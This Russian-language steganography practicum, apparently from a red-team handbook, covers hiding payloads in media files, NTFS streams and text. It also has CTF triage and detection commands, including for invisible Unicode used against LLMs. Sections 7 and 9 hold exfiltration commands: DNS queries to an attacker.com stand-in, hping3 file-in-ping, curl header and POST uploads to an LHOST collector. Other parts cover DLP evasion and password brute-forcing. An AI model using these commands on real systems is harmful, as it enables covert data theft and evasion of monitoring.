# Стеганография - короткий практикум: спрятать и достать файл

> [← README](../../README_RU.md) · [Следующий раздел →](14-troubleshooting.md)

Стего **не шифрует**, а прячет сам факт передачи. Поэтому: `архив -> шифрование -> стего -> передача -> sha256` ([11](11-encryption.md)).

> Главное правило: передавайте **оригинальный файл** (вложением/архивом), а не «фото» через Telegram/WhatsApp. Мессенджеры пережимают JPEG и убивают payload.

```bash
export LHOST=192.168.2.5
export RHOST=192.168.10.20
export PASS='StrongPassphrase!2026'
```

## 1. Быстрый выбор

| Носитель / ситуация | Инструмент |
|---|---|
| JPEG/BMP/WAV, просто и с паролем | `steghide` |
| Проверить/взломать steghide | `stegseek` |
| PNG/BMP + GUI | `OpenStego` |
| PNG/JPEG/WAV/видео одним инструментом | `stegpy` |
| JPEG, классика DCT | `outguess` / `jsteg` |
| WAV, много места | `steghide` / `stegolsb` |
| MP3/WAV + любой файл, Windows | `DeepSound` |
| Текст, невидимые символы | `snow` / `stegcloak` |
| Обход DLP списком слов | `Cloakify` |
| Windows без инструментов | ADS / append-after-EOF |
| Только DNS/ICMP | [12-dns-icmp.md](12-dns-icmp.md) |

---

## 2. Подготовка

**Инструменты (LHOST):**

```bash
sudo apt install -y steghide outguess exiftool binwalk foremost pngcheck imagemagick ffmpeg age poppler-utils
sudo gem install zsteg
pip install stegpy stego-lsb stegoveritas
```

```bash
mkdir -p ~/stego/{cover,payload,out} && cd ~/stego

# тестовый бинарник; в реальности здесь ваш evil.exe
head -c 200000 /dev/urandom > payload/evil.exe
file payload/evil.exe

# архив для стего
zip -9 -j payload/evil.zip payload/evil.exe

# base64 для текстовых каналов
base64 -w0 payload/evil.exe > payload/evil.b64

# зашифровать ДО стего (рекомендуется)
age -p -o payload/evil.zip.age payload/evil.zip

# эталон
sha256sum payload/evil.zip | tee payload/evil.sha256
```

> В примерах ниже payload называется `evil.zip`, а для текстовых каналов - `evil.b64`. Для реальных данных подставляйте `evil.zip.age`.

**Обложки (без интернета):**

```bash
convert -size 1920x1080 plasma:fractal cover/cover.png
convert cover/cover.png -quality 92 cover/cover.jpg
convert -size 4000x3000 plasma:fractal cover/cover_big.png
ffmpeg -f lavfi -i "sine=frequency=440:duration=60" -ac 2 -ar 44100 cover/cover.wav
```

> PNG/BMP - для LSB, JPEG - для steghide/outguess, WAV PCM - для аудио. Чем шумнее текстура, тем лучше.

**Проверка после извлечения:**

```bash
sha256sum evil.zip
cat payload/evil.sha256   # сравнить хеши
unzip -t evil.zip
```

---

## 3. Изображения

### 3.1 steghide (JPEG, BMP, WAV, AU; PNG не умеет)

```bash
sudo apt install -y steghide

# ёмкость
steghide info cover/cover.jpg

# спрятать
steghide embed -cf cover/cover.jpg -ef payload/evil.zip \
  -sf out/evil.jpg -p "$PASS" -z 9

# достать
steghide extract -sf out/evil.jpg -xf evil.zip -p "$PASS"
```

Флаги: `-cf` cover, `-ef` что прячем, `-sf` выход (без него перезапишет cover), `-p` пароль, `-z 9` сжатие.

### 3.2 stegseek (детект и брутфорс steghide)

```bash
wget https://github.com/RickdeJager/stegseek/releases/download/v0.6/stegseek_0.6-1.deb
sudo dpkg -i stegseek_0.6-1.deb

# есть ли steghide-контент
stegseek --seed out/evil.jpg

# подобрать пароль
stegseek out/evil.jpg /usr/share/wordlists/rockyou.txt -xf out/cracked.zip
```

### 3.3 OpenStego (PNG/BMP)

```bash
sudo apt install -y openstego

openstego embed -a randomlsb -e -A AES256 \
  -mf payload/evil.zip -cf cover/cover.png \
  -sf out/openstego.png -p "$PASS"

openstego extract -a randomlsb -sf out/openstego.png -xf evil.zip -p "$PASS"
```

### 3.4 stegpy (PNG/JPEG/WAV/видео)

```bash
pip install stegpy

# спрятать (рядом появится _cover.png)
stegpy payload/evil.zip cover/cover.png -p

# достать (создаст _evil.zip)
stegpy _cover.png -p

# JPEG
stegpy payload/evil.zip cover/cover.jpg -p

# проверить ёмкость носителя
stegpy cover/cover.png -c
```

> Без `-p` данные не шифруются. `-b 1|2|4` - сколько LSB использовать (по умолчанию 2).

### 3.5 outguess / jsteg

```bash
# outguess (JPEG, ключ управляет встраиванием, payload сам не шифрует)
outguess -k "$PASS" -d payload/evil.zip cover/cover.jpg out/outguess.jpg
outguess -k "$PASS" -r out/outguess.jpg out/evil.zip

# jsteg (без пароля, учебный)
go install lukechampine.com/jsteg/cmd/jsteg@latest
# или готовый бинарник: https://github.com/lukechampine/jsteg/releases
jsteg hide cover/cover.jpg payload/evil.zip out/jsteg.jpg
jsteg reveal out/jsteg.jpg out/evil.zip
```

> F5 — старый академический инструмент. Единого `f5.jar` с одинаковым синтаксисом нет: команды зависят от сборки. Для практики берите `outguess` или `jsteg`.

---

## 4. Аудио и видео

### 4.1 steghide в WAV

```bash
steghide info cover/cover.wav

steghide embed -cf cover/cover.wav -ef payload/evil.zip \
  -sf out/evil.wav -p "$PASS" -z 9

steghide extract -sf out/evil.wav -xf evil.zip -p "$PASS"
```

> WAV должен быть PCM. Перекодирование в MP3 убивает payload.

### 4.2 stegolsb (WAV/PNG, чистый LSB)

```bash
pip install stego-lsb

# спрятать
stegolsb wavsteg -h -i cover/cover.wav -s payload/evil.zip \
  -o out/evil.wav -n 2

# достать: нужен точный размер скрытого файла
# на LHOST узнать: stat -c%s payload/evil.zip
SIZE=200000   # заменить на точный размер архива
stegolsb wavsteg -r -i out/evil.wav -o evil.zip -n 2 -b "$SIZE"
```

### 4.3 stegpy video

```bash
stegpy payload/evil.zip cover/clip.mp4 -p    # -> _clip.mp4
stegpy _clip.mp4 -p                          # -> _evil.zip
```

### 4.4 MP4-вложение (быстро, но заметно)

```bash
# спрятать
ffmpeg -i cover/clip.mp4 -attach payload/evil.zip \
  -metadata:s:t mimetype=application/zip \
  -metadata:s:t filename=evil.zip -c copy out/attachment.mp4

# достать
ffmpeg -dump_attachment:t evil.zip -i out/attachment.mp4 -y

# проверка
ffprobe -hide_banner out/attachment.mp4
```

### 4.5 MP3 / GUI

```bash
# MP3Stego: zip -> base64 -> спрятать в MP3
base64 -w0 payload/evil.zip > payload/evil.zip.b64
mp3stego-encode -E payload/evil.zip.b64 -P "$PASS" cover/cover.wav out/evil.mp3

# достать
mp3stego-decode -X -P "$PASS" out/evil.mp3
base64 -d out/evil.mp3.txt > evil.zip
```

> В оригинальной сборке команды могут называться `encode`/`decode`; `mp3stego-encode` - обёртка из stego-toolkit. Некоторые сборки требуют абсолютных путей.

**DeepSound** (Windows): открыть carrier (MP3/WAV) -> `Add secret files` -> пароль -> `Encode`. На приёме - `Extract secret files`.

---

## 5. Текст и документы

### 5.1 snow (пробелы/табы)

```bash
sudo apt install -y snow

# текст
snow -C -m "Meet at 21:00. Code: 7742" -p "$PASS" cover/cover.txt out/evil.txt
snow -C -p "$PASS" out/evil.txt

# snow годится для небольших данных, не для 200-КБ бинаря
head -c 256 payload/evil.exe | base64 -w0 > payload/evil-small.b64
snow -C -m "$(cat payload/evil-small.b64)" -p "$PASS" cover/cover.txt out/evil.txt

# обратно
snow -C -p "$PASS" out/evil.txt > evil-small.b64
base64 -d evil-small.b64 > evil-small.bin
```

> Для больших бинарей и архивов неудобно: snow сильно раздувает текст.

### 5.2 stegcloak (zero-width Unicode + AES)

```bash
sudo apt install -y nodejs npm
sudo npm install -g stegcloak

STEGCLOAK_PASSWORD="$PASS" stegcloak hide "secret text" "Обычное сообщение для коллег."
stegcloak reveal "<текст с невидимыми символами>"
```

Для файла лучше прятать не сам архив, а ссылку/пароль:

```bash
STEGCLOAK_PASSWORD="$PASS" stegcloak hide "https://files.example/abc pass: S3cr3t" "Отчёт за квартал..."
```

### 5.3 Cloakify (данные под видом списка)

```bash
git clone https://github.com/TryCatchHCF/Cloakify && cd Cloakify
# нужен python2.7

# спрятать
gpg -c ../payload/evil.zip
python2 cloakify.py ../payload/evil.zip.gpg ciphers/desserts > ../out/innocent.txt

# достать
python2 decloakify.py ../out/innocent.txt ciphers/desserts > evil.zip.gpg
gpg evil.zip.gpg
```

### 5.4 PDF

```bash
# прикрепить файл
pdfattach cover/cover.pdf payload/evil.zip out/with_attach.pdf

# список и извлечение
pdfdetach -list out/with_attach.pdf
pdfdetach -saveall out/with_attach.pdf
```

### 5.5 Office (docx/xlsx/pptx)

```bash
# дописать zip после EOF
cat payload/evil.zip >> cover/report.docx

# найти
binwalk cover/report.docx
binwalk -e cover/report.docx

# посмотреть XML на скрытый текст
unzip -p cover/report.docx word/document.xml | grep -i -E 'vanish|comment|instrText'
```

---

## 6. Без инструментов: ОС и файловая система

### 6.1 Windows: NTFS ADS

```cmd
:: спрятать
type C:\Temp\evil.zip > C:\Temp\cover.jpg:evil.zip

:: проверить
dir /r C:\Temp\cover.jpg

:: достать
type C:\Temp\cover.jpg:evil.zip > C:\Temp\out.zip
```

**PowerShell (надёжнее для бинарей):**

```powershell
# спрятать (PowerShell 5.1)
$b = [IO.File]::ReadAllBytes("C:\Temp\evil.zip")
Set-Content -Path "C:\Temp\cover.jpg" -Stream "evil.zip" -Value $b -Encoding Byte

# достать
$b = Get-Content -Path "C:\Temp\cover.jpg" -Stream "evil.zip" -Encoding Byte -ReadCount 0
[IO.File]::WriteAllBytes("C:\Temp\out.zip", $b)
```

> PowerShell 7: вместо `-Encoding Byte` - `-AsByteStream`. ADS теряется при копировании на FAT/exFAT, в ZIP и при отправке почтой.

### 6.2 Append-after-EOF

```cmd
:: Windows
copy /b C:\Temp\cover.jpg + C:\Temp\evil.zip C:\Temp\out.jpg
```

```bash
# Linux
cat payload/evil.zip >> cover/cover.jpg
```

```bash
# извлечь по сигнатуре ZIP
python3 - <<'PY'
d = open('cover/cover.jpg','rb').read()
i = d.find(b'PK\x03\x04')
open('evil.zip','wb').write(d[i:])
PY

# или
binwalk -e cover/cover.jpg
```

### 6.3 ZIP-комментарий и метаданные

```bash
# ZIP-комментарий (до 65535 байт)
zip -z out/archive.zip <<< "secret: 7742"
unzip -z out/archive.zip

# exiftool: только для небольших файлов
exiftool -Comment="$(base64 -w0 payload/evil.zip)" cover/cover.jpg
exiftool -s3 -Comment cover/cover.jpg | base64 -d > evil.zip
```

---

## 7. Сеть

### 7.1 DNS / ICMP

Готовые команды - в [12-dns-icmp.md](12-dns-icmp.md). Коротко:

```bash
# LHOST: ловим DNS
sudo tcpdump -i any -n -s0 udp port 53 -w out/dns.pcap

# RHOST: кусок в поддомене
dig +short "$(printf 'hello' | base32 | tr -d '=').t.attacker.com"
```

```bash
# LHOST: ловим ICMP
sudo tcpdump -i any -n -s0 icmp -w out/icmp.pcap

# RHOST: файл в ping
sudo hping3 -1 -E payload/evil.zip -d 1400 $LHOST
```

### 7.2 HTTP-заголовки

```bash
# LHOST: мини-сервер, собирает X-Trace
python3 - <<'PY'
from http.server import BaseHTTPRequestHandler, HTTPServer
import base64

chunks = []
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        v = self.headers.get("X-Trace")
        if v:
            chunks.append(base64.b64decode(v))
            open("out/evil.bin", "wb").write(b"".join(chunks))
        self.send_response(200); self.end_headers(); self.wfile.write(b"ok")
    def log_message(self, *a): pass

HTTPServer(("0.0.0.0", 8080), H).serve_forever()
PY
```

```bash
# RHOST: кусками по 512 байт
split -b 512 payload/evil.zip /tmp/chunk_
for f in /tmp/chunk_*; do
  curl -s -H "X-Trace: $(base64 -w0 "$f")" http://$LHOST:8080/
done
```

### 7.3 Unicode-стеганография: zero-width, гомоглифы, emoji

Работает в тексте, чате, тикете, LLM-промпте. Ёмкость низкая: ~2 бита на символ.

| Символ | Код |
|---|---|
| ZWSP | `U+200B` |
| ZWNJ | `U+200C` |
| ZWJ | `U+200D` |
| BOM | `U+FEFF` |

**Спрятать/достать (Python, учебный):**

```python
ZW = ['\u200b', '\u200c', '\u200d', '\ufeff']

def hide(text: str, data: bytes) -> str:
    if len(data) * 4 > len(text):
        raise ValueError("данные не влезают в текст: нужно 4 символа на 1 байт")
    bits = ''.join(f'{b:08b}' for b in data)
    out = []
    for i, ch in enumerate(text):
        out.append(ch)
        pair = bits[i * 2:i * 2 + 2]
        if len(pair) == 2:
            out.append(ZW[int(pair, 2)])
    return ''.join(out)

def reveal(text: str) -> bytes:
    bits = ''.join(f'{ZW.index(c):02b}' for c in text if c in ZW)
    return bytes(int(bits[i:i + 8], 2) for i in range(0, len(bits) - 7, 8))

payload = b"MZ\x90\x00"  # начало PE-файла, для примера
stego = hide("Обычное сообщение для коллег.", payload)
print(reveal(stego))
```

**Готовый инструмент:** `stegcloak` (см. 5.2).

**Детект:**

```bash
grep -nP '[\x{200B}\x{200C}\x{200D}\x{FEFF}]' suspicious.txt
python3 -c "import unicodedata; s=open('suspicious.txt').read(); print({hex(ord(c)) for c in s if unicodedata.category(c)=='Cf'})"
```

**ASCII smuggling** (невидимые Unicode Tags, `U+E0000`-`U+E007F`) - используется против LLM:

```python
text = open("suspicious.txt", encoding="utf-8").read()
bad = [hex(ord(c)) for c in text if 0xE0000 <= ord(c) <= 0xE007F]
print(bad)
```

---

## 8. Быстрый триаж (CTF / проверка)

```bash
# общий триаж
file f; exiftool f; strings -n 8 f | head; binwalk f; binwalk -e f

# PNG/BMP
zsteg -a f.png
zsteg -E "b1,rgb,lsb,xy" f.png > out.bin
stegoveritas f.png -outdir out/veritas
pngcheck -v f.png

# JPEG
steghide info f.jpg
steghide extract -sf f.jpg -xf out -p ''
stegseek --seed f.jpg
stegseek f.jpg /usr/share/wordlists/rockyou.txt
outguess -k 'pass' -r f.jpg out

# аудио
sox f.wav -n spectrogram -o spec.png
steghide extract -sf f.wav -xf out -p ''

# текст
snow -C -p pass f.txt
grep -nP '[\x{200B}\x{200C}\x{200D}\x{FEFF}]' f.txt

# PDF/Office
pdfdetach -list f.pdf
pdfdetach -saveall f.pdf
unzip -l f.docx
unzip -p f.docx word/document.xml | grep -i vanish

# PCAP
tshark -r f.pcap -Y 'dns.qry.name' -T fields -e dns.qry.name | sort -u
tshark -r f.pcap -Y 'icmp.type == 8' -T fields -e data.data
```

> 80% CTF-стего - это `steghide` с пустым паролем, `zsteg` или `binwalk`. Начинайте с них, не с экзотики.

---

## 9. Сквозные сценарии

### 9.1 LHOST -> RHOST: доставить файл в картинке

```bash
# LHOST: архив уже собран в payload/evil.zip
steghide info cover/cover.jpg
steghide embed -cf cover/cover.jpg -ef payload/evil.zip \
  -sf out/vacation.jpg -p "$PASS" -z 9

# LHOST: раздать
cd out && python3 -m http.server 8080
```

```powershell
# RHOST: скачать обычную картинку
iwr "http://${LHOST}:8080/vacation.jpg" -OutFile "C:\Temp\vacation.jpg"
```

```powershell
# RHOST: достать (через WSL)
wsl steghide extract -sf /mnt/c/Temp/vacation.jpg -xf evil.zip -p 'StrongPassphrase!2026'
```

```bash
# RHOST: проверить
sha256sum evil.zip
unzip -t evil.zip
```

### 9.2 RHOST -> LHOST: эксфил через PNG

```python
# LHOST: save_upload.py
from http.server import BaseHTTPRequestHandler, HTTPServer

class H(BaseHTTPRequestHandler):
    def do_POST(self):
        n = int(self.headers.get('Content-Length', 0))
        open('out/upload.png', 'ab').write(self.rfile.read(n))
        self.send_response(200); self.end_headers(); self.wfile.write(b'ok')
    def log_message(self, *a): pass

HTTPServer(('0.0.0.0', 8080), H).serve_forever()
```

```bash
# LHOST
python3 save_upload.py
```

```bash
# RHOST: спрятать и отправить как обычный файл
stegpy payload/evil.zip cover/cover.png -p
curl -s -X POST --data-binary @_cover.png http://$LHOST:8080/upload
```

```bash
# LHOST: извлечь
stegpy out/upload.png -p
```

---

## 10. Типовые ошибки

| Ошибка | Что делать |
|---|---|
| `steghide` на PNG | steghide не умеет PNG: `zsteg`, `OpenStego`, `stegpy` |
| `zsteg` на JPEG | zsteg не умеет JPEG: `steghide`, `stegseek`, `outguess` |
| Забыли `-sf` | steghide перезапишет cover |
| `the file is too big` | взять больше/шумнее cover или PNG-инструмент |
| `could not extract any data with that passphrase` | неверный пароль или файл пережат |
| Фото отправили в Telegram | рекомпрессия убила LSB: отправлять файлом/архивом |
| WAV не достаётся | указать точный размер `-b` |
| Пароль `123456` | stegseek ломает за секунды; 16+ символов + шифрование до стего |
| Извлекли, но хеш не совпал | файл повреждён/пережат/не тот пароль |
| «Стего = шифрование» | нет: сначала `age`/`gpg`/`7z`, потом прятать |

**Мини-чек-лист:**

```text
[ ] payload зашифрован до стего
[ ] cover логичен для контекста
[ ] capacity > payload * 1.3
[ ] стего открывается как обычный файл
[ ] извлечение проверено на другой машине
[ ] sha256 совпал
[ ] пароль передан другим каналом
[ ] временные файлы удалены
```

---

[← Назад к справочнику](../../README_RU.md)
